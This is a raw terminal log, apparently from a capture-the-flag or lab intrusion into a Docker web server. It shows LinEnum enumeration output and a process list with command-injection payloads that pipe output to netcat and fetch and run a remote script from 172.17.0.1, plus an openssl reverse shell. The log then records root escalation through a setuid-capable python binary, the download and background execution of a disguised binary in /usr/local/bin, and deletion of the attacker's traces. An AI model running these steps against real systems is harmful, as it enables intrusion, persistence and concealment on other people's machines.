+-rw-r--r-- 1 www-data www-data 5713 Nov 20 21:58 /tmp/LinEnum-export-20-11-19/conf-files/etc/ca-certificates.conf
+-rw-r--r-- 1 www-data www-data 34 Nov 20 21:58 /tmp/LinEnum-export-20-11-19/conf-files/etc/ld.so.conf
+-rw-r--r-- 1 www-data www-data 191 Nov 20 21:58 /tmp/LinEnum-export-20-11-19/conf-files/etc/libaudit.conf
+-rw-r--r-- 1 www-data www-data 2969 Nov 20 21:58 /tmp/LinEnum-export-20-11-19/conf-files/etc/debconf.conf
+-rw-r--r-- 1 www-data www-data 2351 Nov 20 21:58 /tmp/LinEnum-export-20-11-19/conf-files/etc/sysctl.conf
+-rw-r--r-- 1 www-data www-data 812 Nov 20 21:58 /tmp/LinEnum-export-20-11-19/conf-files/etc/mke2fs.conf
+-rw-r--r-- 1 www-data www-data 552 Nov 20 21:58 /tmp/LinEnum-export-20-11-19/conf-files/etc/pam.conf
+-rw-r--r-- 1 www-data www-data 2584 Nov 20 21:58 /tmp/LinEnum-export-20-11-19/conf-files/etc/gai.conf
+-rw-r--r-- 1 www-data www-data 494 Nov 20 21:58 /tmp/LinEnum-export-20-11-19/conf-files/etc/nsswitch.conf
+-rw-r--r-- 1 www-data www-data 642 Nov 20 21:58 /tmp/LinEnum-export-20-11-19/conf-files/etc/xattr.conf
+-rwxr-xr-x 1 www-data www-data 63736 Nov 20 21:58 /tmp/LinEnum-export-20-11-19/suid-files/passwd
+-rwxr-xr-x 1 www-data www-data 54096 Nov 20 21:58 /tmp/LinEnum-export-20-11-19/suid-files/chfn
+-rwxr-xr-x 1 www-data www-data 34888 Nov 20 21:58 /tmp/LinEnum-export-20-11-19/suid-files/umount
+-rwxr-xr-x 1 www-data www-data 44440 Nov 20 21:58 /tmp/LinEnum-export-20-11-19/suid-files/newgrp
+-rwxr-xr-x 1 www-data www-data 84016 Nov 20 21:58 /tmp/LinEnum-export-20-11-19/suid-files/gpasswd
+-rwxr-xr-x 1 www-data www-data 51280 Nov 20 21:58 /tmp/LinEnum-export-20-11-19/suid-files/mount
+-rwxr-xr-x 1 www-data www-data 44528 Nov 20 21:58 /tmp/LinEnum-export-20-11-19/suid-files/chsh
+-rwxr-xr-x 1 www-data www-data 63568 Nov 20 21:58 /tmp/LinEnum-export-20-11-19/suid-files/su
+-rw-r--r-- 1 www-data www-data 1302 Nov 20 19:34 /dev/shm/cert.pem
+
+
+.[00;31m[-] Hidden files:.[00m
+-rw-r--r-- 1 root root 2470 Oct 25 02:29 /usr/local/lib/php/.depdb
+-rw-r--r-- 1 root root 0 Oct 25 02:29 /usr/local/lib/php/.lock
+-rw-r--r-- 1 root root 6961 Oct 25 02:29 /usr/local/lib/php/.filemap
+-rw-r--r-- 1 root root 0 Oct 25 02:29 /usr/local/lib/php/.depdblock
+-rw-r--r-- 1 root root 3526 Apr 18  2019 /etc/skel/.bashrc
+-rw-r--r-- 1 root root 807 Apr 18  2019 /etc/skel/.profile
+-rw-r--r-- 1 root root 220 Apr 18  2019 /etc/skel/.bash_logout
+-rw------- 1 root root 0 Oct 14 00:00 /etc/.pwd.lock
+-rwxr-xr-x 1 root root 0 Nov 20 21:51 /.dockerenv
+
+
+.[00;31m[-] Home directory contents:.[00m
+total 16K
+drwxr-xr-x 1 root     root     4.0K Oct 17 14:22 .
+drwxr-xr-x 1 root     root     4.0K Oct 17 14:22 ..
+drwxrwxrwx 1 www-data www-data 4.0K Nov 20 21:25 html
+
+
+.[00;33m### ENVIRONMENTAL #######################################.[00m
+.[00;31m[-] Environment information:.[00m
+PWD=/tmp
+APACHE_LOG_DIR=/var/log/apache2
+LANG=C
+APACHE_PID_FILE=/var/run/apache2/apache2.pid
+APACHE_RUN_GROUP=www-data
+APACHE_LOCK_DIR=/var/lock/apache2
+SHLVL=1
+APACHE_RUN_DIR=/var/run/apache2
+APACHE_RUN_USER=www-data
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+OLDPWD=/var/www/html
+_=/usr/bin/env
+
+
+.[00;31m[-] Path information:.[00m
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+
+
+.[00;31m[-] Available shells:.[00m
+# /etc/shells: valid login shells
+/bin/sh
+/bin/bash
+/bin/rbash
+/bin/dash
+
+
+.[00;31m[-] Current umask value:.[00m
+0022
+u=rwx,g=rx,o=rx
+
+
+.[00;31m[-] umask value as specified in /etc/login.defs:.[00m
+UMASK		022
+
+
+.[00;31m[-] Password and storage information:.[00m
+PASS_MAX_DAYS	99999
+PASS_MIN_DAYS	0
+PASS_WARN_AGE	7
+ENCRYPT_METHOD SHA512
+
+
+.[00;33m### JOBS/TASKS ##########################################.[00m
+.[00;31m[-] Cron jobs:.[00m
+total 28
+drwxr-xr-x 1 root root 4096 Oct 25 02:29 .
+drwxr-xr-x 1 root root 4096 Nov 20 21:54 ..
+-rwxr-xr-x 1 root root  539 Apr  2  2019 apache2
+-rwxr-xr-x 1 root root 1478 May 28 14:40 apt-compat
+-rwxr-xr-x 1 root root 1187 Apr 19  2019 dpkg
+-rwxr-xr-x 1 root root  249 Sep 27  2017 passwd
+
+
+.[00;33m### NETWORKING  ##########################################.[00m
+.[00;31m[-] Network and IP info:.[00m
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 172.17.0.5  netmask 255.255.0.0  broadcast 172.17.255.255
+        ether 02:42:ac:11:00:05  txqueuelen 0  (Ethernet)
+        RX packets 176459  bytes 28675389 (27.3 MiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 175122  bytes 11842577 (11.2 MiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 106  bytes 8585 (8.3 KiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 106  bytes 8585 (8.3 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+
+.[00;31m[-] ARP history:.[00m
+? (172.17.0.3) at 02:42:ac:11:00:03 [ether] on eth0
+? (172.17.0.1) at 02:42:e3:cc:ad:d4 [ether] on eth0
+
+
+.[00;31m[-] Nameserver(s):.[00m
+nameserver 192.168.40.2
+
+
+.[00;31m[-] Default route:.[00m
+default         172.17.0.1      0.0.0.0         UG    0      0        0 eth0
+
+
+.[00;31m[-] Listening TCP:.[00m
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
+
+
+.[00;31m[-] Listening UDP:.[00m
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+
+
+.[00;33m### SERVICES #############################################.[00m
+.[00;31m[-] Running processes:.[00m
+USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root         1  0.0  0.0   3864  3232 pts/0    Ss+  21:51   0:00 /bin/bash
+root       296  0.0  0.2  83080 18172 ?        Ss   21:53   0:00 /usr/sbin/apache2 -k start
+www-data   298  0.0  0.1  83288 11016 ?        S    21:53   0:00 /usr/sbin/apache2 -k start
+www-data   301  0.0  0.1  83160 10976 ?        S    21:53   0:00 /usr/sbin/apache2 -k start
+www-data   850  0.0  0.1  83152  8296 ?        S    21:55   0:00 /usr/sbin/apache2 -k start
+www-data   852  0.0  0.1  83152 10588 ?        S    21:55   0:00 /usr/sbin/apache2 -k start
+www-data   854  0.0  0.1  83152 10648 ?        S    21:55   0:00 /usr/sbin/apache2 -k start
+www-data   856  0.0  0.1  83152  8296 ?        S    21:55   0:00 /usr/sbin/apache2 -k start
+www-data   857  0.0  0.1  83152  8296 ?        S    21:55   0:00 /usr/sbin/apache2 -k start
+www-data   859  0.0  0.1  83152  8296 ?        S    21:55   0:00 /usr/sbin/apache2 -k start
+www-data   861  0.0  0.1  83152  8296 ?        S    21:55   0:00 /usr/sbin/apache2 -k start
+www-data   864  0.0  0.1  83288 11144 ?        S    21:55   0:00 /usr/sbin/apache2 -k start
+www-data   869  0.0  0.0   2384   756 ?        S    21:56   0:00 sh -c ping -c 3 127.0.0.1; id | nc 172.17.0.1 12345
+www-data   872  0.0  0.0   3280  1888 ?        S    21:56   0:00 nc 172.17.0.1 12345
+www-data   873  0.0  0.0   2384   684 ?        S    21:56   0:00 sh -c ping -c 3 127.0.0.1 ; curl -k https://172.17.0.1/a.sh | bash
+www-data   876  0.0  0.0   3732  2900 ?        S    21:56   0:00 bash
+www-data   880  0.0  0.0   2384   752 ?        S    21:56   0:00 /bin/sh -i
+www-data   881  0.0  0.0   6972  5480 ?        S    21:56   0:00 /usr/bin/openssl s_client -quiet -CAfile /dev/shm/cert.pem -verify_return_error -verify 1 -connect 172.17.0.1:8443
+www-data   882  0.0  0.0  12344  7052 ?        S    21:57   0:00 python -c import pty;pty.spawn("/bin/bash")
+www-data   883  0.0  0.0   3864  3228 pts/1    Ss   21:57   0:00 /bin/bash
+www-data  1553  0.0  0.0   4524  3736 pts/1    S+   21:59   0:00 /bin/bash ./LinEnum.sh -t -e /tmp -r report
+www-data  1555  0.4  0.0   4652  3324 pts/1    S+   21:59   0:00 /bin/bash ./LinEnum.sh -t -e /tmp -r report
+www-data  1556  0.0  0.0   2296   736 pts/1    S+   21:59   0:00 tee -a report-20-11-19
+www-data  1760  0.0  0.0   4652  2616 pts/1    S+   22:00   0:00 /bin/bash ./LinEnum.sh -t -e /tmp -r report
+www-data  1761  0.0  0.0   7636  2700 pts/1    R+   22:00   0:00 ps aux
+
+
+.[00;31m[-] Process binaries and associated permissions (from above list):.[00m
+-rwxr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash
+lrwxrwxrwx 1 root root       4 Oct 14 00:00 /bin/sh -> dash
+-rwxr-xr-x 1 root root  736776 Oct 12 19:56 /usr/bin/openssl
+-rwxr-xr-x 1 root root  687944 Oct 15 19:53 /usr/sbin/apache2
+
+
+.[00;31m[-] /etc/init.d/ binary permissions:.[00m
+total 32
+drwxr-xr-x 1 root root 4096 Oct 17 14:28 .
+drwxr-xr-x 1 root root 4096 Nov 20 21:54 ..
+-rwxr-xr-x 1 root root 2489 Apr  2  2019 apache-htcacheclean
+-rwxr-xr-x 1 root root 8181 Apr  2  2019 apache2
+-rwxr-xr-x 1 root root 3809 Jan 10  2019 hwclock.sh
+-rwxr-xr-x 1 root root  924 May 31  2018 procps
+
+
+.[00;31m[-] /lib/systemd/* config file permissions:.[00m
+/lib/systemd/:
+total 4.0K
+drwxr-xr-x 1 root root 4.0K Oct 25 02:29 system
+
+/lib/systemd/system:
+total 40K
+-rw-r--r-- 1 root root 603 Oct 13 20:21 apache-htcacheclean.service
+-rw-r--r-- 1 root root 612 Oct 13 20:21 apache-htcacheclean@.service
+-rw-r--r-- 1 root root 395 Oct 13 20:21 apache2.service
+-rw-r--r-- 1 root root 467 Oct 13 20:21 apache2@.service
+-rw-r--r-- 1 root root 389 May 28 14:40 apt-daily-upgrade.service
+-rw-r--r-- 1 root root 184 May 28 14:40 apt-daily-upgrade.timer
+-rw-r--r-- 1 root root 326 May 28 14:40 apt-daily.service
+-rw-r--r-- 1 root root 156 May 28 14:40 apt-daily.timer
+-rw-r--r-- 1 root root 151 Jan 10  2019 fstrim.service
+-rw-r--r-- 1 root root 170 Jan 10  2019 fstrim.timer
+
+
+.[00;33m### SOFTWARE #############################################.[00m
+.[00;31m[-] Apache version:.[00m
+Server version: Apache/2.4.38 (Debian)
+Server built:   2019-10-15T19:53:42
+
+
+.[00;31m[-] Apache user configuration:.[00m
+: ${APACHE_RUN_USER:=www-data}
+APACHE_RUN_USER
+: ${APACHE_RUN_GROUP:=www-data}
+APACHE_RUN_GROUP
+
+
+.[00;31m[-] Installed Apache modules:.[00m
+Loaded Modules:
+ core_module (static)
+ so_module (static)
+ watchdog_module (static)
+ http_module (static)
+ log_config_module (static)
+ logio_module (static)
+ version_module (static)
+ unixd_module (static)
+ access_compat_module (shared)
+ alias_module (shared)
+ auth_basic_module (shared)
+ authn_core_module (shared)
+ authn_file_module (shared)
+ authz_core_module (shared)
+ authz_host_module (shared)
+ authz_user_module (shared)
+ autoindex_module (shared)
+ deflate_module (shared)
+ dir_module (shared)
+ env_module (shared)
+ filter_module (shared)
+ mime_module (shared)
+ mpm_prefork_module (shared)
+ negotiation_module (shared)
+ php7_module (shared)
+ reqtimeout_module (shared)
+ setenvif_module (shared)
+ status_module (shared)
+
+
+.[00;31m[-] www home dir contents:.[00m
+/var/www/:
+total 16K
+drwxr-xr-x 1 root     root     4.0K Oct 17 14:22 .
+drwxr-xr-x 1 root     root     4.0K Oct 17 14:22 ..
+drwxrwxrwx 1 www-data www-data 4.0K Nov 20 21:25 html
+
+/var/www/html:
+total 12K
+drwxrwxrwx 1 www-data www-data 4.0K Nov 20 21:25 .
+drwxr-xr-x 1 root     root     4.0K Oct 17 14:22 ..
+-rw-rw-r-- 1 root     root      866 Nov 20 21:23 index.php
+
+
+.[00;33m### INTERESTING FILES ####################################.[00m
+.[00;31m[-] Useful file locations:.[00m
+/bin/nc
+/bin/netcat
+/usr/bin/wget
+/usr/bin/gcc
+/usr/bin/curl
+
+
+.[00;31m[-] Installed compilers:.[00m
+ii  g++                           4:8.3.0-1                   amd64        GNU C++ compiler
+ii  g++-8                         8.3.0-6                     amd64        GNU C++ compiler
+ii  gcc                           4:8.3.0-1                   amd64        GNU C compiler
+ii  gcc-8                         8.3.0-6                     amd64        GNU C compiler
+
+
+.[00;31m[-] Can we read/write sensitive files:.[00m
+-rw-r--r-- 1 root root 926 Oct 14 00:00 /etc/passwd
+-rw-r--r-- 1 root root 446 Oct 14 00:00 /etc/group
+-rw-r--r-- 1 root root 767 Mar  4  2016 /etc/profile
+-rw-r----- 1 root shadow 501 Oct 14 00:00 /etc/shadow
+
+
+.[00;31m[-] SUID files:.[00m
+-rwsr-xr-x 1 root root 34888 Jan 10  2019 /bin/umount
+-rwsr-xr-x 1 root root 51280 Jan 10  2019 /bin/mount
+-rwsr-xr-x 1 root root 63568 Jan 10  2019 /bin/su
+-rwsr-xr-x 1 root root 63736 Jul 27  2018 /usr/bin/passwd
+-rwsr-xr-x 1 root root 54096 Jul 27  2018 /usr/bin/chfn
+-rwsr-xr-x 1 root root 44440 Jul 27  2018 /usr/bin/newgrp
+-rwsr-xr-x 1 root root 84016 Jul 27  2018 /usr/bin/gpasswd
+-rwsr-xr-x 1 root root 44528 Jul 27  2018 /usr/bin/chsh
+
+
+.[00;31m[-] SGID files:.[00m
+-rwxr-sr-x 1 root shadow 31000 Jul 27  2018 /usr/bin/expiry
+-rwxr-sr-x 1 root tty 34896 Jan 10  2019 /usr/bin/wall
+-rwxr-sr-x 1 root shadow 71816 Jul 27  2018 /usr/bin/chage
+-rwxr-sr-x 1 root shadow 39616 Feb 14  2019 /sbin/unix_chkpwd
+
+
+.[00;31m[+] Files with POSIX capabilities set:.[00m
+/bin/ping = cap_net_raw+ep
+/usr/bin/python2.7 = cap_setuid,cap_net_bind_service+ep
+
+
+.[00;31m[-] NFS displaying partitions and filesystems - you need to check if exotic filesystems.[00m
+# UNCONFIGURED FSTAB FOR BASE SYSTEM
+
+
+[-] Can't search *.conf files as no keyword was entered
+
+[-] Can't search *.php files as no keyword was entered
+
+[-] Can't search *.log files as no keyword was entered
+
+[-] Can't search *.ini files as no keyword was entered
+
+.[00;31m[-] All *.conf files in /etc (recursive 1 level):.[00m
+-rw-r--r-- 1 root root 9 Aug  7  2006 /etc/host.conf
+-rw-r--r-- 1 root root 608 Nov 20 21:51 /etc/resolv.conf
+-rw-r--r-- 1 root root 604 Jun 26  2016 /etc/deluser.conf
+-rw-r--r-- 1 root root 2981 Oct 14 00:00 /etc/adduser.conf
+-rw-r--r-- 1 root root 34 Mar  2  2018 /etc/ld.so.conf
+-rw-r--r-- 1 root root 191 Apr 25  2019 /etc/libaudit.conf
+-rw-r--r-- 1 root root 2969 Feb 26  2019 /etc/debconf.conf
+-rw-r--r-- 1 root root 812 Aug  3 03:49 /etc/mke2fs.conf
+-rw-r--r-- 1 root root 552 Feb 14  2019 /etc/pam.conf
+-rw-r--r-- 1 root root 2584 Aug  1  2018 /etc/gai.conf
+-rw-r--r-- 1 root root 494 Feb 10  2019 /etc/nsswitch.conf
+-rw-r--r-- 1 root root 642 Mar  1  2019 /etc/xattr.conf
+-rw-r--r-- 1 root root 2351 May 31  2018 /etc/sysctl.conf
+-rw-r--r-- 1 root root 5713 Oct 17 14:22 /etc/ca-certificates.conf
+
+
+.[00;31m[-] Any interesting mail in /var/mail:.[00m
+total 12
+drwxrwsr-x 2 root mail 4096 Oct 14 00:00 .
+drwxr-xr-x 1 root root 4096 Oct 17 14:22 ..
+
+
+.[00;33m[+] Looks like we're in a Docker container:.[00m
+12:pids:/docker/d58feef475e49734d305bcbb4da32e9ff9ba6dd625679ec2c3d20a720b75f4ae
+11:freezer:/docker/d58feef475e49734d305bcbb4da32e9ff9ba6dd625679ec2c3d20a720b75f4ae
+10:cpuset:/docker/d58feef475e49734d305bcbb4da32e9ff9ba6dd625679ec2c3d20a720b75f4ae
+9:perf_event:/docker/d58feef475e49734d305bcbb4da32e9ff9ba6dd625679ec2c3d20a720b75f4ae
+8:devices:/docker/d58feef475e49734d305bcbb4da32e9ff9ba6dd625679ec2c3d20a720b75f4ae
+7:memory:/docker/d58feef475e49734d305bcbb4da32e9ff9ba6dd625679ec2c3d20a720b75f4ae
+6:net_cls,net_prio:/docker/d58feef475e49734d305bcbb4da32e9ff9ba6dd625679ec2c3d20a720b75f4ae
+5:hugetlb:/docker/d58feef475e49734d305bcbb4da32e9ff9ba6dd625679ec2c3d20a720b75f4ae
+3:cpu,cpuacct:/docker/d58feef475e49734d305bcbb4da32e9ff9ba6dd625679ec2c3d20a720b75f4ae
+2:blkio:/docker/d58feef475e49734d305bcbb4da32e9ff9ba6dd625679ec2c3d20a720b75f4ae
+1:name=systemd:/docker/d58feef475e49734d305bcbb4da32e9ff9ba6dd625679ec2c3d20a720b75f4ae
+-rwxr-xr-x 1 root root 0 Nov 20 21:51 /.dockerenv
+
+
+.[00;33m### SCAN COMPLETE ####################################.[00m
+www-data@d58feef475e4:/tmp$ /usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'
+
+< -c 'import os; os.setuid(0); os.system("/bin/sh")'
+# id
+id
+uid=0(root) gid=33(www-data) groups=33(www-data)
+# cd /root
+cd /root
+# ls
+ls
+flag
+# ls -la
+ls -la
+total 20
+drwx------ 1 root root 4096 Nov 20 21:37 .
+drwxr-xr-x 1 root root 4096 Nov 20 21:51 ..
+-rw-r--r-- 1 root root  570 Jan 31  2010 .bashrc
+-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
+-r-------- 1 root root   28 Nov 20 21:36 flag
+# wc -c flag
+wc -c flag
+28 flag
+# stat flag
+stat flag
+  File: flag
+  Size: 28        	Blocks: 8          IO Block: 4096   regular file
+Device: 78h/120d	Inode: 6206622     Links: 1
+Access: (0400/-r--------)  Uid: (    0/    root)   Gid: (    0/    root)
+Access: 2019-11-20 21:36:58.000000000 +0000
+Modify: 2019-11-20 21:36:58.000000000 +0000
+Change: 2019-11-20 21:38:07.737200347 +0000
+ Birth: -
+# echo -n 'Il y a le flag dans le /root'
+echo -n 'Il y a le flag dans le /root'
+Il y a le flag dans le /root# 
+
+# 
+
+# cd /usr/local/bin
+cd /usr/local/bin
+# pwd
+pwd
+/usr/local/bin
+# s
+s
+/bin/sh: 12: s: not found
+# ls
+ls
+apache2-foreground	  docker-php-ext-install  peardev    php
+docker-php-entrypoint	  docker-php-source	  pecl	     php-config
+docker-php-ext-configure  freetype-config	  phar	     phpdbg
+docker-php-ext-enable	  pear			  phar.phar  phpize
+# wget --no-check-certificate https://172.17.0.1/DRUNK_IKEBANA -O phar.bak
+wget --no-check-certificate https://172.17.0.1/DRUNK_IKEBANA -O phar.bak
+--2019-11-20 22:03:12--  https://172.17.0.1/DRUNK_IKEBANA
+Connecting to 172.17.0.1:443... connected.
+WARNING: The certificate of '172.17.0.1' is not trusted.
+WARNING: The certificate of '172.17.0.1' doesn't have a known issuer.
+The certificate's owner does not match hostname '172.17.0.1'
+HTTP request sent, awaiting response... 200 OK
+Length: 7634240 (7.3M) [application/octet-stream]
+Saving to: 'phar.bak'
+
+
+phar.bak              0%[                    ]       0  --.-KB/s               
+phar.bak            100%[===================>]   7.28M  --.-KB/s    in 0.05s   
+
+2019-11-20 22:03:12 (146 MB/s) - 'phar.bak' saved [7634240/7634240]
+
+# ls
+ls
+apache2-foreground	  docker-php-ext-install  peardev   phar.phar	phpize
+docker-php-entrypoint	  docker-php-source	  pecl	    php
+docker-php-ext-configure  freetype-config	  phar	    php-config
+docker-php-ext-enable	  pear			  phar.bak  phpdbg
+# ls -la
+ls -la
+total 35168
+drwxr-xr-x 1 root root         4096 Nov 20 22:03 .
+drwxr-xr-x 1 root root         4096 Oct 25 02:29 ..
+-rwxrwxr-x 1 root root         1346 Oct 25 02:26 apache2-foreground
+-rwxrwxr-x 1 root root          133 Oct 25 02:26 docker-php-entrypoint
+-rwxrwxr-x 1 root root         1418 Oct 25 02:26 docker-php-ext-configure
+-rwxrwxr-x 1 root root         2571 Oct 25 02:26 docker-php-ext-enable
+-rwxrwxr-x 1 root root         2392 Oct 25 02:26 docker-php-ext-install
+-rwxrwxr-x 1 root root          587 Oct 25 02:26 docker-php-source
+-rwxr-xr-x 1 root root           41 Oct 25 02:29 freetype-config
+-rwxr-xr-x 1 root root          817 Oct 25 02:29 pear
+-rwxr-xr-x 1 root root          838 Oct 25 02:29 peardev
+-rwxr-xr-x 1 root root          751 Oct 25 02:29 pecl
+lrwxrwxrwx 1 root root            9 Oct 25 02:29 phar -> phar.phar
+-rw-r--r-- 1 root www-data  7634240 Nov 20 22:02 phar.bak
+-rwxr-xr-x 1 root root        14817 Oct 25 02:29 phar.phar
+-rwxr-xr-x 1 root root     14077688 Oct 25 02:29 php
+-rwxr-xr-x 1 root root         2793 Oct 25 02:29 php-config
+-rwxr-xr-x 1 root root     14213184 Oct 25 02:29 phpdbg
+-rwxr-xr-x 1 root root         4559 Oct 25 02:29 phpize
+# chmod +x phar.bak
+chmod +x phar.bak
+# ls -la
+ls -la
+total 35168
+drwxr-xr-x 1 root root         4096 Nov 20 22:03 .
+drwxr-xr-x 1 root root         4096 Oct 25 02:29 ..
+-rwxrwxr-x 1 root root         1346 Oct 25 02:26 apache2-foreground
+-rwxrwxr-x 1 root root          133 Oct 25 02:26 docker-php-entrypoint
+-rwxrwxr-x 1 root root         1418 Oct 25 02:26 docker-php-ext-configure
+-rwxrwxr-x 1 root root         2571 Oct 25 02:26 docker-php-ext-enable
+-rwxrwxr-x 1 root root         2392 Oct 25 02:26 docker-php-ext-install
+-rwxrwxr-x 1 root root          587 Oct 25 02:26 docker-php-source
+-rwxr-xr-x 1 root root           41 Oct 25 02:29 freetype-config
+-rwxr-xr-x 1 root root          817 Oct 25 02:29 pear
+-rwxr-xr-x 1 root root          838 Oct 25 02:29 peardev
+-rwxr-xr-x 1 root root          751 Oct 25 02:29 pecl
+lrwxrwxrwx 1 root root            9 Oct 25 02:29 phar -> phar.phar
+-rwxr-xr-x 1 root www-data  7634240 Nov 20 22:02 phar.bak
+-rwxr-xr-x 1 root root        14817 Oct 25 02:29 phar.phar
+-rwxr-xr-x 1 root root     14077688 Oct 25 02:29 php
+-rwxr-xr-x 1 root root         2793 Oct 25 02:29 php-config
+-rwxr-xr-x 1 root root     14213184 Oct 25 02:29 phpdbg
+-rwxr-xr-x 1 root root         4559 Oct 25 02:29 phpize
+# ./phar.bak &
+./phar.bak &
+# cd /tmp
+cd /tmp
+# ls
+ls
+LinEnum-export-20-11-19  LinEnum.sh  report-20-11-19  s
+# rm Lin*
+rm Lin*
+rm: cannot remove 'LinEnum-export-20-11-19': Is a directory
+# ls
+ls
+LinEnum-export-20-11-19  report-20-11-19  s
+# rm -rf Lin*
+rm -rf Lin*
+# ls
+ls
+report-20-11-19  s
+# rm repo*
+rm repo*
+# cd /dev/shm
+cd /dev/shm
+# ls
+ls
+cert.pem
+# cd /root
+cd /root
+# ls -la
+ls -la
+total 20
+drwx------ 1 root root 4096 Nov 20 21:37 .
+drwxr-xr-x 1 root root 4096 Nov 20 21:51 ..
+-rw-r--r-- 1 root root  570 Jan 31  2010 .bashrc
+-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
+-r-------- 1 root root   28 Nov 20 21:36 flag
+# exit
+exit
+www-data@d58feef475e4:/tmp$ exit
+exit
+exit
+exit
+exit
+exit
+exit
+exit
+exit
